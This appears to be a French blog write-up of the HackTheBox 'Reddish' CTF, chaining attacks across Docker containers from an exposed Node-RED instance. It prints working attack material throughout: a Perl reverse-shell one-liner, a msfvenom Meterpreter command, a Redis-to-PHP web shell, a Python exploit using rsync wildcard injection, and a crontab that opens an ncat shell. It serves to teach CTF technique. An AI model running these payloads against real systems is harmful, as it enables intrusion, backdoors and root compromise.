# Solution du CTF Reddish de HackTheBox

Unboxing
--------

*Reddish* est une machine Linux proposée sur HTB et créée par *yuntao*. 50 points viennent s'ajouter au score de ceux qui en viennent à boût, on peut donc s'attendre à une bonne difficulté.  

Balance ton flow
----------------

Un scan Nmap ne nous amène pas grand chose : tout juste un serveur web utilisant Node.  

```plain
1880/tcp open  http    Node.js Express framework
```

Quand on se rend sur le site on obtient juste le message *Cannot GET /*.  

Ok ok... qu'est-ce que tu nous propose alors ?  

```plain
$ curl -D- -X OPTIONS http://10.10.10.94:1880/
HTTP/1.1 200 OK
X-Powered-By: Express
Allow: POST
Content-Type: text/html; charset=utf-8
Content-Length: 4
ETag: W/"4-Yf+Bwwqjx254r+pisuO9HfpJ6FQ"
Date: Sat, 12 Jan 2019 15:55:50 GMT
Connection: keep-alive
```

Il suffisait de demander :) Va pour un petit POST  

```plain
$ curl -D- -X POST http://10.10.10.94:1880/
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 86
ETag: W/"56-FkMnpS+K97XmAD6ijILTyh7YZ3A"
Date: Sat, 12 Jan 2019 13:59:09 GMT
Connection: keep-alive

{"id":"8312251822ff2a9be87b835b6be13a11","ip":"::ffff:10.10.14.99","path":"/red/{id}"}
```

On sait additionner 2 + 2 alors on en déduit qu'il faut se rendre sur */red/8312251822ff2a9be87b835b6be13a11* et on tombe sur un [Node-RED](https://nodered.org/) qui se définit comme un *Flow-based programming for the Internet of Things*.  

En gros sur la colonne de gauche vous avez une liste d'actions, événements, conditions, etc (qui sont baptisées *nodes*) que vous pouvez placer dans le graphe puis les relier entre eux pour définir un automate (oui on est en 2019 et j'ai dit automate :D ).  

C'est plutôt fun à utiliser et ça peut être une bonne introduction à ceux qui souhaitent s'initier à la programmation.  

Quoiqu'il en soit j'ai commencé à jouer avec cette interface qui m'était totalement inconnue et je suis par exemple parvenus à lire des fichiers présents sur le disque :  

![HackTheBox Reddish CTF Node-RED file disclosure](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/reddish/reddish_web.png)

Ici l'action consiste à lire un fichier. Pour cela on prend l'icône marron *file* dans la section *storage*, on la place dans le graphe puis on double clique pour entrer le path du fichier (*/etc/passwd* dans mon exemple).  

On le relie alors à une sortie de type *tcp* où l'on rentre l'hôte et le port, on clique sur le bouton rouge *Deploy* et on reçoit ce qu'on attendait :  

```plain
$ ncat -l -p 7777 -v
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::7777
Ncat: Listening on 0.0.0.0:7777
Ncat: Connection from 10.10.10.94.
Ncat: Connection from 10.10.10.94:52718.
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
node:x:1000:1000::/home/node:/bin/bash
```

C'est un bon début mais ça ne nous amène malheureusement pas bien loin. Heureusement il y a une action *exec* qui sans trop de surprise permet d'exécuter des commandes du système (la colonne à droite donne les informations sur la *node* sélectionnée).  

J'ai un peu galéré à l'utiliser avant de comprendre que le déclencheur utilisé en début de chaîne n'était pas adapté. Il faut s'en remettre à la *node* baptisée *inject* qui est par défaut de type *timestamp*.  

L'avantage de cette *node* c'est que l'action se déclenche tout simplement quand on clique sur le petit carré sur sa gauche :)  

Un timestamp est alors passé à la *node* suivante. Dans le cas de la node exec ce timestamp serait utilisé comme argument pour la commande choisie.  

Il faut prendre soin dans les options d'*exec* de dire que l'on ne souhaite pas utiliser cette entrée (case à décocher, voir plus bas) et de définir nous même les arguments.  

Après quelques essais peu concluants pour obtenir un reverse shell j'ai exploré un peu le système de fichier de la machine pour voir qu'il s'agissait d'un docker (fichier *.dockerenv* à la racine) très minimaliste (pas de *netcat* bien sûr mais pas non plus de Python, de curl ni de wget, argh...)  

Tout juste un *Perl*... Allez il faut pas faire le difficile :D J'ai ressorti ce vieux [dc.pl](https://gist.github.com/islanddog/f5ad7636acf61fd963531ead7c784dc9) (je compte pas le nombre de machines que je lui ait fait visiter à une époque lointaine...) mais là encore grosse déception :  

![HackTheBox Reddish CTF Node-RED Perl TCP FAIL](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/reddish/reddish_perl_broken.png)

Quoi ? *Unknown Protocol* ? técépé tu connais pas ? Argh c'est pas vrai !  

Du coup je suis reparti dans mes *nodes* à la recherche du *Graal* pour uploader un fichier.  

Petite aparté, quand j'ai eu accès au système plus tard j'ai vu que certains étaient parvenu à obtenir leur reverse shell avec ce one-liner :  

```bash
perl -MIO -e $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.13.103:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;
```

Oui Perl ça pique les yeux :p  

Finalement c'est ce download-execute en *Node-RED* qui a eu ma faveur :  

![HackTheBox Reddish CTF Node-RED download execute](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/reddish/reddish_download_execute.png)

![HackTheBox Reddish CTF Node-RED exec node](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/reddish/reddish_exec.png)

Il télécharge un *Meterpreter* (généré via *msfvenom -p linux/x64/meterpreter\_reverse\_tcp LHOST=10.10.14.99 LPORT=7777 -f elf -o devloop.bin*) sur mon serveur web (il faut indiquer dans la node que l'on souhaite en sortie un buffer et non une chaîne de caractères UTF-8) et l'écrit à l'emplacement de notre choix.  

Ensuite j'appelle *exec* sur */bin/sh* avec les arguments *-c "chmod +x /tmp/devloop.bin; /tmp/devloop.bin &"*.  

On obtient alors notre session *Meterpreter* et on n'est qu'au début d'un looooog voyage :)  

```plain
meterpreter > ifconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0

Interface  9
============
Name         : eth0
Hardware MAC : 02:42:ac:12:00:02
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 172.18.0.2
IPv4 Netmask : 255.255.0.0

Interface 17
============
Name         : eth1
Hardware MAC : 02:42:ac:13:00:04
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 172.19.0.4
IPv4 Netmask : 255.255.0.0
```

Quand on est sur une image Docker on peut exploiter le socket spécifique quand il est présent comme [sur le CTF Game of Thrones](http://devloop.users.sourceforge.net/index.php?article136/solution-du-ctf-game-of-thrones-1-de-vulnhub), sinon (et c'est le cas ici) on peut essayer de se déplacer de container en container jusqu'à trouver ce que l'on cherche (nos fameux flags).  

Plus d'infos sur l'exploitation Docker peuvent être trouvées dans [ces slides de la Blackhat 2018](https://i.blackhat.com/us-18/Thu-August-9/us-18-McGrew-An-Attacker-Looks-At-Docker-Approaching-Multi-Container-Applications-wp.pdf).  

Redis de perdu, 10 de retrouvés
-------------------------------

Pour trouver les autres containers on va scanner les réseaux accessibles. Uploader Nmap et toutes ses dépendances ça semble plutôt compliqué (*ldd nmap* pour rigoler) heureusement il y a [ce répo Github](https://github.com/andrew-d/static-binaries/tree/master/binaries/linux/x86_64) qui propose différents outils compilés statiquement (et déjà strippés s'il vous plait).  

Une fois uploadé Nmap se plaignait de l'absence du fichier *nmap-services* : même punition, upload dans le même dossier et ça fonctionne :)  

```plain
./nmap -sT -T5 -p1-65535 -oA devloop --open 172.19.0.0/16

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2019-01-14 20:08 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for reddish_composition_redis_1.reddish_composition_internal-network (172.19.0.2)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.0012s latency).
Not shown: 65534 closed ports
PORT     STATE SERVICE
6379/tcp open  redis
MAC Address: 02:42:AC:13:00:02 (Unknown)

Nmap scan report for reddish_composition_www_1.reddish_composition_internal-network (172.19.0.3)
Host is up (0.0012s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:13:00:03 (Unknown)
```

On s'empresse de port-forwarder ces deux ports depuis notre session Meterpreter (cela permet d'avoir les ports directements accessibles sur 127.0.0.1, Meterpreter fait le reste).  

```plain
portfwd add -l 6379 -p 6379 -r 172.19.0.2
portfwd add -l 80 -p 80 -r 172.19.0.3
```

Sur le port 80 on ne trouve pas grand chose : juste une install par défaut avec le message *It works!*  

Pour le Redis c'est plus intéressant. Certes si on effectue un *searchsploit redis* depuis Kali on ne trouve rien d'exceptionnel pourtant il existe des techniques permettant d'exploiter un Redis exposé sans authentification.  

Metasploit dispose d'un module *auxiliary/scanner/redis/file\_upload* dont la description est assez parlante :  

```plain
Description:
  This module can be used to leverage functionality exposed by Redis
  to achieve somewhat arbitrary file upload to a file and directory to
  which the user account running the redis instance has access. It is
  not totally arbitrary because the exact contents of the file cannot
  be completely controlled given the nature of how Redis stores its
  database on disk.
```

L'exploitation peut aussi se faire plus simplement en se connectant sur le port Redis à l'aide de telnet (qui s’occupera d'envoyer des CRLF). On peut voir plusieurs scénarios d'explotation sur le blog de [Urahara](http://reverse-tcp.xyz/pentest/database/2017/02/09/Redis-Hacking-Tips.html).  

Le client redis semble lui utiliser un formatage légèrement plus poussé, assez propre du bencoding utilisé par Bittorent, dans tous les cas il est assez simple d'écrire à titre d'exemple un outil de brute-force de compte Unix pour espérer trouver un dossier .ssh accessible :  

```python
import socket
import sys

cmd = (
    "*4\r\n"
    "$6\r\n"
    "config\r\n"
    "$3\r\n"
    "set\r\n"
    "$3\r\n"
    "dir\r\n"
    "${}\r\n"
    "{}\r\n"
)

sock = socket.socket()
sock.connect(('127.0.0.1', 9999))

with open(sys.argv[1], errors="ignore") as fd:
    for username in fd:
        username = username.strip()
        path = "/home/{}/.ssh/".format(username)
        payload = cmd.format(len(path), path)
        sock.send(payload.encode())
        buff = sock.recv(1024).decode()
        if "No such file or directory" in buff:
            continue
        else:
            print(username, buff)

sock.close()
```

Malheureusement pas de serveur SSH accessible ici, l’intérêt est donc très limité. En revanche la présence du serveur web nous incite à tester l'autre scénario consistant à écrire du code PHP sous la racine web */var/www/html*.  

Pour celà on envoie les commandes suivantes au Redis :  

```plain
config set dir /var/www/html
set dbfilename devloop.php
set payload "<?php system($_GET['cmd']); ?>
save
```

A noter que payload est un nom de clé pris pour l'exemple, on peut mettre ce que l'on veut. Le Redis acquiesce sans broncher (série de réponses OK) puis on obtient finalement notre shell.  

![HackTheBox Reddish CTF Redis exploitation leading to PHP backdoor](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/reddish/reddish_www_container.png)

J'ai toutefois noté deux problèmes récurrents :  

* L'existence d'autres clés/valeurs dans le Redis peut mener à un fichier PHP avec des problèmes d'encodage qui ne sera alors pas interprété :(
* Une tâche semble supprimer le fichier uploadé rapidement

Pour régler le premier problème j'ai mis un commentaire ouvrant à la fin de mon script PHP et omis de le fermer (tout comme le tag PHP). PHP est en effet assez permissif, il faillait exploiter l'une de ces caractéristiques pour résoudre [le CTF Homeless](http://devloop.users.sourceforge.net/index.php?article150/solution-du-ctf-homeless-de-vulnhub).  

Pour le second problème j'ai vu que les dotfiles ne semblent pas supprimées par la tache, il suffit donc de préfixer notre nom de fichier par un point.  

Sur cette machine où l'on dispose de droits restreints (www-data) on peut voir les dossiers personnels de deux utilisateurs du système :  

```plain
/home:
total 32
drwxr-xr-x 5 root root  4096 Jul 15  2018 .
drwxr-xr-x 1 root root  4096 Jul 15  2018 ..
drwxr-xr-x 2 1001 1001  4096 Jul 16  2018 bergamotto
drwx------ 2 root root 16384 Apr  1  2018 lost+found
drwxr-xr-x 2 1000 1000  4096 Jul 16  2018 somaro

/home/bergamotto:
total 20
drwxr-xr-x 2 1001 1001 4096 Jul 16  2018 .
drwxr-xr-x 5 root root 4096 Jul 15  2018 ..
lrwxrwxrwx 1 root root    9 Jul 16  2018 .bash_history -> /dev/null
-rw-r--r-- 1 1001 1001  220 May  2  2018 .bash_logout
-rw-r--r-- 1 1001 1001 3771 May  2  2018 .bashrc
-rw-r--r-- 1 1001 1001  655 May  2  2018 .profile

/home/somaro:
total 24
drwxr-xr-x 2 1000 1000 4096 Jul 16  2018 .
drwxr-xr-x 5 root root 4096 Jul 15  2018 ..
lrwxrwxrwx 1 root root    9 Jul 16  2018 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Apr 23  2018 .bash_logout
-rw-r--r-- 1 1000 1000 3771 Apr 23  2018 .bashrc
-rw-r--r-- 1 1000 1000  655 Apr 23  2018 .profile
-r-------- 1 1000 1000   33 Apr 23  2018 user.txt
```

Le flag ne nous est malheureusement pas accessible :'(  

On trouve en revanche un script */backup/backup.sh* plus intéressant car exploitable via l'utilisation d'astérisque non protégés :  

```bash
cd /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
rsync -a *.rdb rsync://backup:873/src/rdb/
cd / && rm -rf /var/www/html/*
rsync -a rsync://backup:873/src/backup/ /var/www/html/
chown www-data. /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
```

[Ce document](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt) indique comment on peut exploiter la première commande rsync en créant deux fichiers.  

Le premier sera nommé *-e sh devloop.rdb* et sera vide, ce sera lui qui s'injectera dans la commande rsync.  

le second devra être nommé *devloop.rdb* et contiendra la commande que l'on souhaite faire exécuter.  

J'ai préféré automatiser toute cette partie de l'exploitation car ça commence à faire beaucoup de commandes et donc beaucoup de temps à passer...  

Voici l'une des premières versions du script :  

```python
import socket
import re
from urllib.parse import quote
from base64 import b64encode
import requests

md5_regex = re.compile(r"[a-f0-9]{32}")

sock = socket.socket()
sock.connect(('127.0.0.1', 6379))
sock.send(b'config set dir /var/www/html\r\n')
print(sock.recv(1024))
sock.send(b'config set dbfilename .devloop.php\r\n')
print(sock.recv(1024))
sock.send(b'set payload "<?php system($_GET[\'cmd\']); /*"\r\n')
print(sock.recv(1024))
sock.send(b'save\r\n')
print(sock.recv(1024))
sock.close()

sess = requests.session()
response = sess.get("http://127.0.0.1/.devloop.php?cmd=" + quote("md5sum /tmp/devloop_nc"))
if response.status_code == 404:
    print("Redis exploitation failed!")
    exit()

search = md5_regex.search(response.text)

if not search or search.group() != "43248ae1630f1e244fcec241ea5ad780":
    response = sess.get("http://127.0.0.1/.devloop.php?cmd=" + quote("rm /tmp/devloop_nc*"))
    with open("nc.traditional", "rb") as fd:
        buff = b64encode(fd.read())
        i = 0
        print("Uploading...")
        while True:
            data = buff[i:i+1024].decode()
            i += 1024
            cmd = "echo -n '{}' >> /tmp/devloop_nc.b64".format(data)
            response = sess.get("http://127.0.0.1/.devloop.php?cmd=" + quote(cmd))
            if response.status_code != 200:
                print("Oups, got error code", response.status_code)
                exit()

            if len(data) < 1024:
                break

    sess.get("http://127.0.0.1/.devloop.php?cmd=" + quote("base64 -d /tmp/devloop_nc.b64 > /tmp/devloop_nc"))
    sess.get("http://127.0.0.1/.devloop.php?cmd=" + quote("chmod +x /tmp/devloop_nc"))

response = sess.get("http://127.0.0.1/.devloop.php?cmd=" + quote("md5sum /tmp/devloop_nc"))
md5sum = md5_regex.search(response.text).group()
if md5sum != "43248ae1630f1e244fcec241ea5ad780":
    print(response.text)
    exit()

print("Great success")

sess.get("http://127.0.0.1/.devloop.php?cmd=" + quote("echo '/tmp/devloop_nc -e /bin/sh 172.19.0.4 7777 &' > /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/devloop.rdb"))
sess.get("http://127.0.0.1/.devloop.php?cmd=" + quote("touch '/var/www/html/f187a0ec71ce99642e4f0afbd441a68b/-e sh devloop.rdb'"))
response = sess.get("http://127.0.0.1/.devloop.php?cmd=" + quote("ls -al /var/www/html/f187a0ec71ce99642e4f0afbd441a68b/"))
print(response.text)
```

Ce script copie un netcat sous forme encodée (base64) vers */tmp* et insère la commande permettant de nous envoyer un reverse shell dans le fichier *rdb* (il faut donc avoir préalablement mis en écoute un ncat/netcat sur le container *Node* de tout à l'heure).  

On attend un peu que le script de backup soit exécuté :  

```plain
Ncat: Connection from 172.19.0.2.
Ncat: Connection from 172.19.0.2:43312.
id
uid=0(root) gid=0(root) groups=0(root)
hostname
www
```

Cool, maintenant on est root sur le container www ce qui nous permet d'accéder au flag de l'utilisateur *somaro* (c09aca7cb02... ) :)  

Bitterish
---------

Maintenant que l'on est root on peut explorer plus en détails le système, en particulier voir les interfaces réseau.  

Vu que *ifconfig* n'est pas présent sur le système et qu'on ne dispose pas ici d'un *Meterpreter* j'ai placé le script d'upload suivant sur le système :  

```php
<?php
if(!empty($_FILES['uploaded_file']))
{
    $path = "/tmp/" . basename($_FILES['uploaded_file']['name']);
    if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
      echo "uploaded";
    } else{
        echo "error";
    }
}
?>
```

Je peux alors m'envoyer les binaires manquant de cette façon via le tunnel créé plus tôt par *Meterpreter* :  

```bash
curl -F "uploaded_file=@/sbin/ifconfig"  http://127.0.0.1/.devloop_upload.php
```

Pour les gros binaires statiques il aura fallu les compresser au préalable avec xz sans quoi le script d'upload échoue.  

On découvre alors un nouveau réseau en 120.20 :  

```plain
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.20.0.2  netmask 255.255.0.0  broadcast 172.20.255.255
        ether 02:42:ac:14:00:02  txqueuelen 0  (Ethernet)
        RX packets 489  bytes 1082361 (1.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 454  bytes 34765 (33.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.19.0.2  netmask 255.255.0.0  broadcast 172.19.255.255
        ether 02:42:ac:13:00:02  txqueuelen 0  (Ethernet)
        RX packets 141  bytes 121109 (118.2 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 98  bytes 22233 (21.7 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        loop  txqueuelen 1  (Local Loopback)
        RX packets 172  bytes 9142 (8.9 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 172  bytes 9142 (8.9 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

On envoie à nouveau un Nmap et on recommence. On n'est pas trop surpris de voir un serveur rsync :  

```plain
Nmap scan report for reddish_composition_backup_1.reddish_composition_internal-network-2 (172.20.0.2)
Host is up (0.00012s latency).
Not shown: 65526 closed ports
PORT      STATE    SERVICE
873/tcp   open     rsync
5872/tcp  filtered unknown
18127/tcp filtered unknown
18458/tcp filtered unknown
18992/tcp filtered unknown
21886/tcp filtered unknown
29660/tcp filtered unknown
31169/tcp filtered unknown
42189/tcp filtered unknown
MAC Address: 02:42:AC:14:00:02 (Unknown)
```

Via rsync on peut donc lire les fichiers présents sur le système mais on n'y trouve rien d'intéressant (le flag *root.txt* n'est pas présent).  

```plain
$ rsync rsync://backup:873/
src             src path

$ rsync rsync://backup:873/src/
drwxr-xr-x          4,096 2018/07/15 17:42:39 .
-rwxr-xr-x              0 2018/05/04 21:01:30 .dockerenv
-rwxr-xr-x            100 2018/05/04 19:55:07 docker-entrypoint.sh
drwxr-xr-x          4,096 2018/07/15 17:42:41 backup
drwxr-xr-x          4,096 2018/07/15 17:42:39 bin
drwxr-xr-x          4,096 2018/07/15 17:42:38 boot
drwxr-xr-x          4,096 2018/07/15 17:42:39 data
drwxr-xr-x          3,720 2019/01/18 15:38:43 dev
drwxr-xr-x          4,096 2018/07/15 17:42:39 etc
drwxr-xr-x          4,096 2018/07/15 17:42:38 home
drwxr-xr-x          4,096 2018/07/15 17:42:39 lib
drwxr-xr-x          4,096 2018/07/15 17:42:38 lib64
drwxr-xr-x          4,096 2018/07/15 17:42:38 media
drwxr-xr-x          4,096 2018/07/15 17:42:38 mnt
drwxr-xr-x          4,096 2018/07/15 17:42:38 opt
dr-xr-xr-x              0 2019/01/18 15:38:43 proc
drwxr-xr-x          4,096 2018/07/15 17:42:39 rdb
drwx------          4,096 2018/07/15 17:42:38 root
drwxr-xr-x          4,096 2019/01/18 15:38:45 run
drwxr-xr-x          4,096 2018/07/15 17:42:38 sbin
drwxr-xr-x          4,096 2018/07/15 17:42:38 srv
dr-xr-xr-x              0 2019/01/18 16:00:43 sys
drwxrwxrwt          4,096 2019/01/18 16:34:01 tmp
drwxr-xr-x          4,096 2018/07/15 17:42:39 usr
drwxr-xr-x          4,096 2018/07/15 17:42:39 var

$ rsync rsync://backup:873/src/var/spool/cron/crontabs/
drwx-wx--T          4,096 2018/07/15 17:42:39 .
```

Le rsync nous permet aussi de déposer des fichiers sur la machine *backup* par conséquent notre plan d'attaque consiste à uploader d'abord un *ncat* statique et ensuite ajouter une crontab qui nous envoie un reverse shell.  

Voici les commandes que j'ai tapé :  

```bash
echo "*/1 * * * * touch /tmp/yolo & /bin/ncat -e /bin/sh 172.20.0.3 9999" > root
chown root.crontab root
chmod 600 root
rsync -a ncat rsync://backup:873/src/bin/
rsync -a root rsync://backup:873/src/var/spool/cron/crontabs/
```

Maintenant c'est compliqué de gérer dans le même shell sur le container *www* l'exploitation et la réception du reverse shell, en particulier parce que si le reverse shell ne vient pas on va avoir du mal à stopper notre listener ncat sans tout couper et tout perdre (ou presque) :D (le shell est très basique, pas de pty).  

Par conséquent le listener *ncat* ne sera pas lancé sur le docker *www* mais sur *nodered* (le premier). Sur *www* on exécutera un socat qui fera une redirection de port :  

```bash
./socat TCP-LISTEN:9999,fork,reuseaddr TCP:172.19.0.4:9999 &
```

Cette commande est du coup à placer avant l'exécution rsync ;-)   

Cette fois on le tient notre accès root sur le dernier container :  

```plain
Ncat: Connection from 172.19.0.3.
Ncat: Connection from 172.19.0.3:57776.
id
uid=0(root) gid=0(root) groups=0(root)
hostname
backup
pwd
/root
ls -al
total 16
drwx------ 2 root root 4096 Jul 15  2018 .
drwxr-xr-x 1 root root 4096 Jul 15  2018 ..
-rw-r--r-- 1 root root  570 Jan 31  2010 .bashrc
-rw-r--r-- 1 root root  140 Nov 19  2007 .profile
```

Sh\*t toujours pas de flag root :'(   

L'exploration du système a été très particulière puisque à ce stade je dispose d'une unique session *Meterpreter* avec deux channels : l'un sur *www* et l'autre sur *backup*.  

Il aura fallut switcher en permanence de l'un à l'autre : utiliser rsync depuis *www* pour envoyer les commandes manquantes et autres scripts vers *backup* puis switcher sur *backup* pour réceptionner les scripts et les exécuter.  

[LinEnum](https://github.com/rebootuser/LinEnum) ne m'a rien remonté que je savais déjà (Hé on est sur un container Docker !)  

Je m'en suis remis aux conseils de [r0pSteev](https://twitter.com/stevenaathan4) qui invitaient à se pencher sur les partitions du système.  

```plain
$ lsblk -o NAME,FSTYPE,SIZE,MOUNTPOINT,LABEL
NAME   FSTYPE  SIZE MOUNTPOINT LABEL
sda             18G
|-sda1 ext4    5.5G /etc/hosts
|-sda2 ext4    1.5G
|-sda3 ext4    1.5G
|-sda4           1K
`-sda5 swap    9.5G [SWAP]
sr0           1024M
```

Et effectivement :  

```plain
mount -t ext4 /dev/sda1 /mnt
ls -l /mnt
total 104
drwxr-xr-x  2 root root  4096 Jul 16  2018 bin
drwxr-xr-x  2 root root  4096 Jul 15  2018 boot
drwxr-xr-x  4 root root  4096 Jul 15  2018 dev
drwxr-xr-x 98 root root  4096 Jul 16  2018 etc
drwxr-xr-x  2 root root  4096 Jul 15  2018 home
lrwxrwxrwx  1 root root    33 Jul 16  2018 initrd.img -&gt; boot/initrd.img-4.4.0-130-generic
lrwxrwxrwx  1 root root    33 Apr 20  2018 initrd.img.old -&gt; boot/initrd.img-4.4.0-119-generic
drwxr-xr-x 25 root root  4096 Jul 15  2018 lib
drwxr-xr-x  2 root root  4096 Jul 15  2018 lib64
drwx------  2 root root 16384 Apr  1  2018 lost+found
drwxr-xr-x  3 root root  4096 Jul 15  2018 media
drwxr-xr-x  2 root root  4096 Jul 15  2018 mnt
drwxr-xr-x  3 root root  4096 Jul 15  2018 opt
drwxr-xr-x  2 root root  4096 Jul 15  2018 proc
drwx------  5 root root  4096 Jul 16  2018 root
drwxr-xr-x  2 root root  4096 Jul 15  2018 run
drwxr-xr-x  2 root root 12288 Jul 16  2018 sbin
drwxr-xr-x  2 root root  4096 Jul 15  2018 snap
drwxr-xr-x  2 root root  4096 Jul 15  2018 srv
drwxr-xr-x  2 root root  4096 Jul 15  2018 sys
drwxrwxrwt  9 root root  4096 Jan 17 10:24 tmp
drwxr-xr-x 10 root root  4096 Jul 15  2018 usr
drwxr-xr-x 13 root root  4096 Jul 15  2018 var
lrwxrwxrwx  1 root root    30 Jul 16  2018 vmlinuz -&gt; boot/vmlinuz-4.4.0-130-generic
lrwxrwxrwx  1 root root    30 Apr 20  2018 vmlinuz.old -&gt; boot/vmlinuz-4.4.0-119-generic
ls /mnt/root
root.txt
cat /mnt/root/root.txt
50d0db6 -- snip --17c2ed205
```

On n'oublie pas de démonter ensuite la partition pour ne pas *gâcher* le plaisir aux autres héhéhé.  

Finish Reddish
--------------

J'ai essayé de reconstituer un graphe des attaques en utilisant [Cacoo](https://cacoo.com) et sauf erreur ça ressemblerait à ceci :  

![HackTheBox Reddish CTF attach graph](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/reddish/reddish_graph.png)

Ce qui fait de ce CTF un vrai casse-tête ce sont clairement les difficultés à devoir pivoter et reverse-pivoter d'une machine à une autre. A ce sujet il existe quelques outils mais tous semblent manquer une fonctionnalité *reverse* (à moins d'être en mesure d'utiliser SSH). Une lacune que j'espère voire comblée :)   

Le tout était d'autant plus compliqué que d'un reset de la box à un autre les adresses IPs des containers pouvaient changer sensiblement :|   

Un peu sur ma fin pour la fin du CTF, j'attend de voir les writeups des autres participants pour savoir s'il y avait un indice particulier pour les partitions.

*Published January 26 2019 at 17:48*